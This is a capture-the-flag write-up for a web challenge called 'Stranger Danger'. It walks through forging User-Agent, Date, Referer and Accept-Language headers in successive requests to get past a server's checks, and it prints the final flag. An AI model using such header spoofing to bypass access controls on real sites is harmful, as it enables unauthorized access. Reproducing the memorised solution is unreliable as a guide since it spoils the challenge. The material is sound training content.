# Stranger Danger! (web) (author: stn)

## Tools

An internet browser application (duuuh, web challenge :))

Visual Studio Code with REST Client plugin - for sending easy HTTP requests (https://code.visualstudio.com/Download)

## Description

```
GET the flag at

https://21b3c563fffa4ab488481f30d9a07360.azurewebsites.net/api/stranger-danger

Depends where you're stuck, pick your hint :)

```

## Task analysis & solution

As with any other web challenge, let's fire up the page in a browser (or VSCode :) ). We're greeted by the message:

```
This page is only accessible from MilestoneBrowser.
```

That's interesting. Let's examine the page's HTML for anything interesting. You can do that by right clicking anywhere within the page and selecting "View page source" on Chrome (I assume every browser has its own option), fire up the developer tools - this is usually accessed by pressing F12 or fire up a GET request through VSCode's REST plugin. Here's the HTML:

```html
<html>
    <head>
        <meta name="color-scheme" content="light dark">
    </head>
    <body>
        <pre style="word-wrap: break-word; white-space: pre-wrap;">This page is only accessible from MilestoneBrowser.</pre>
    </body>
</html>
```


Nothing interesting in the HTML.. Let's think about this message... Is there a way for us to actually present ourselves as working from a 'MilestoneBrowser'?

There might actually be a way, through HTTP headers. 
HTTP headers are a way for clients and servers to pass additional information in these requests. Looking through the list of headers at https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers, there seems to be a good candidate - User-Agent:

```
Contains a characteristic string that allows the network protocol peers to identify the application type, operating system, software vendor or software version of the requesting software user agent.
```


In Visual Studio Code, once you've installed the REST Client plugin, you can create an http file. Once you do, put the following lines in and click on the "Send Request".

```
GET https://21b3c563fffa4ab488481f30d9a07360.azurewebsites.net/api/stranger-danger
User-Agent: MilestoneBrowser

######## RESPONSE

HTTP/1.1 400 Bad Request
Connection: close
Content-Type: text/plain; charset=utf-8
Server: Kestrel
Transfer-Encoding: chunked
Request-Context: appId=cid-v1:3aacb1cd-0f05-4714-9283-262023d43cde

This page doesn't work in December.
```


It seems like we got a little bit further this time. We're definately getting a new message now, stating the page doesn't work in December. Strange, CyberXMas is always in December :) If we go back to our HTTP headers reference page, we should be able to see that there's a Date header that is meant to provide information about the exact date and time this request originated. Let's set that to some time in November.

```
GET https://21b3c563fffa4ab488481f30d9a07360.azurewebsites.net/api/stranger-danger
User-Agent: MilestoneBrowser
Date: Sun, 12 Nov 2023 12:53:44 GMT

######## RESPONSE

HTTP/1.1 400 Bad Request
Connection: close
Content-Type: text/plain; charset=utf-8
Server: Kestrel
Transfer-Encoding: chunked
Request-Context: appId=cid-v1:3aacb1cd-0f05-4714-9283-262023d43cde

I don't trust strangers coming from other sites.
```


Woohoo, it seems we got a step closer, but now we have yet another problem. Judging by the new message we got, we would have to somehow trick the site to think that our request originates locally. It seems like the Referer header is what we need. We would have to specify the site itself, as the value for it.

```
GET https://21b3c563fffa4ab488481f30d9a07360.azurewebsites.net/api/stranger-danger
User-Agent: MilestoneBrowser
Date: Sun, 12 Nov 2023 12:53:44 GMT
Referer: https://21b3c563fffa4ab488481f30d9a07360.azurewebsites.net/api/stranger-danger

######## RESPONSE

HTTP/1.1 400 Bad Request
Connection: close
Content-Type: text/plain; charset=utf-8
Server: Kestrel
Transfer-Encoding: chunked
Request-Context: appId=cid-v1:3aacb1cd-0f05-4714-9283-262023d43cde

I trust you now, but the flag is useless unless you understand Esperanto.
```


This never ends, does it? :( Our next task would be to convince the site that we understand Esperanto. I think we got just the header for it: Accept-Language. A quick Google search suggests that we can denote Esperanto by giving it a value of 'eo'. Let's go for it..

```
GET https://21b3c563fffa4ab488481f30d9a07360.azurewebsites.net/api/stranger-danger
User-Agent: MilestoneBrowser
Date: Sun, 12 Nov 2023 12:53:44 GMT
Referer: https://21b3c563fffa4ab488481f30d9a07360.azurewebsites.net/api/stranger-danger
Accept-Language: eo

######## RESPONSE

HTTP/1.1 400 Bad Request
Connection: close
Content-Type: text/plain; charset=utf-8
Server: Kestrel
Transfer-Encoding: chunked
Request-Context: appId=cid-v1:3aacb1cd-0f05-4714-9283-262023d43cde

MilestoneCTF{http-headers-are-fun}
```


It seems like we ran to the end! The flag is **MilestoneCTF{http-headers-are-fun}**